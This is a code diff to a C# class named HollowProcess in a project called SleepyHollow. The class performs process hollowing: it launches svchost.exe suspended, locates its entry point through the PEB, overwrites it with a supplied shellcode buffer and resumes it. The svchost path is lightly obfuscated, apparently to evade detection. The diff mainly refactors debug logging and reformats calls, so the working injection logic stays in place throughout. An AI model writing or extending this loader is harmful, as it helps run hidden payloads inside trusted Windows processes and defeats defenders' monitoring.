@@ -1,4 +1,5 @@
 using System.Runtime.InteropServices;
+
 namespace SleepyHollow;
 
 /// <summary>
@@ -11,11 +12,24 @@ internal static class HollowProcess
     const int OFFSET_ENTRYPOINT_RVA = 0x28;
     const int CLASS_PROCESS_INFORMATION = 0x0;
 
-    internal static Task Run(byte[] buf, bool debug = false)
+    internal static Task Run(byte[] buf)
     {
         var si = new StartupInfo();
-        var result = Lib.CreateProcessW(null, GetBinary(), IntPtr.Zero, IntPtr.Zero, false, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out ProcessInformation pi);
-        if (result && debug) Console.WriteLine($"CreateProcess was successful - SvcHost PID: {pi.dwProcessId}");
+        var result = Lib.CreateProcessW(
+            null,
+            GetBinary(),
+            IntPtr.Zero,
+            IntPtr.Zero,
+            false,
+            CreateProcessFlags.CREATE_SUSPENDED,
+            IntPtr.Zero,
+            null,
+            ref si,
+            out ProcessInformation pi
+        );
+        
+        if (result && RuntimeConfig.IsDebugEnabled)
+            Console.WriteLine($"CreateProcess was successful - SvcHost PID: {pi.dwProcessId}");
 
         if (!result)
         {
@@ -24,18 +38,21 @@ internal static class HollowProcess
             return Task.CompletedTask;
         }
 
-        var entryPointAddress = GetEntryPoint(pi.hProcess, debug);
-        if (debug) Console.WriteLine($"Address of entry point: 0x{entryPointAddress:X}");
+        var entryPointAddress = GetEntryPoint(pi.hProcess);
+        if (RuntimeConfig.IsDebugEnabled)
+            Console.WriteLine($"Address of entry point: 0x{entryPointAddress:X}");
 
         Lib.WriteProcessMemory(pi.hProcess, entryPointAddress, buf, buf.Length, out IntPtr nRead);
         var writeStatus = Lib.GetLastWin32Error();
         if (writeStatus != SystemErrorCodes.ERROR_SUCCESS)
         {
-            if (debug) Console.WriteLine($"Error writing to process memory - error: {writeStatus}");
+            if (RuntimeConfig.IsDebugEnabled)
+                Console.WriteLine($"Error writing to process memory - error: {writeStatus}");
             return Task.CompletedTask;
         }
 
-        if (debug) Console.WriteLine($"Wrote {nRead.ToInt64()} bytes to process memory");
+        if (RuntimeConfig.IsDebugEnabled)
+            Console.WriteLine($"Wrote {nRead.ToInt64()} bytes to process memory");
 
         Execute(pi);
         return Task.CompletedTask;
@@ -58,24 +75,28 @@ internal static class HollowProcess
     {
         var names = new string[] { "c:", "wIndOWs", "SYsTem32" };
         var n = new int[] { 115, 118, 99, 104, 111, 115, 116, 46, 101, 120, 101 };
-        var nm = Enumerable.Range(0, n.Length)
-            .Select(x => (char)(n[x] + 1))
-            .ToArray();
-        nm = Enumerable.Range(0, nm.Length)
-            .Select(x => (char)(nm[x] - 1))
-            .ToArray();
+        var nm = Enumerable.Range(0, n.Length).Select(x => (char)(n[x] + 1)).ToArray();
+        nm = Enumerable.Range(0, nm.Length).Select(x => (char)(nm[x] - 1)).ToArray();
         return Path.Combine(names[0], names[1], names[2], new string(nm));
     }
 
-    private static IntPtr GetEntryPoint(IntPtr hProcess, bool debug = false)
+    private static IntPtr GetEntryPoint(IntPtr hProcess)
     {
-        if (debug) Console.WriteLine($"Retrieving entrypoint...");
+        if (RuntimeConfig.IsDebugEnabled)
+            Console.WriteLine($"Retrieving entrypoint...");
         var bi = new ProcessBasicInformation();
         uint tmp = 0;
         //retrieve pointer to PEB
-        var ret = Lib.ZwQueryInformationProcess(hProcess, CLASS_PROCESS_INFORMATION, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
+        var ret = Lib.ZwQueryInformationProcess(
+            hProcess,
+            CLASS_PROCESS_INFORMATION,
+            ref bi,
+            (uint)(IntPtr.Size * 6),
+            ref tmp
+        );
         IntPtr ptrToImageBase = (IntPtr)((long)bi.PebAddress + 0x10);
-        if (debug) Console.WriteLine($"Pointer to image base: 0x{ptrToImageBase:X}");
+        if (RuntimeConfig.IsDebugEnabled)
+            Console.WriteLine($"Pointer to image base: 0x{ptrToImageBase:X}");
 
         //read address of image base
         var addrBuf = new byte[IntPtr.Size];
